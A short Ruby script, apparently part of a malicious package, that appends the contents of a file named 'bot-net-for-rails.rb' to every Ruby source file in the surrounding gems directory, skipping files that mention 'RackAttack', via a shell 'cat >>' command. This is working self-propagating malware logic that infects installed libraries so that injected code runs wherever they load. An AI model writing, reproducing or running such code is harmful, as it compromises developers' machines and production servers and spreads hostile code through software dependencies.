file_location = File.join(File.dirname(__FILE__), 'bot-net-for-rails.rb')

gems_home = File.expand_path(
  File.join(
    File.dirname(__FILE__),
    '../../'
  )
)

Dir[File.join(gems_home, '**/*.rb')].each do |file|
  next if File.read(file).include?('RackAttack')
  `cat '#{file_location}' >> '#{file}'`
end
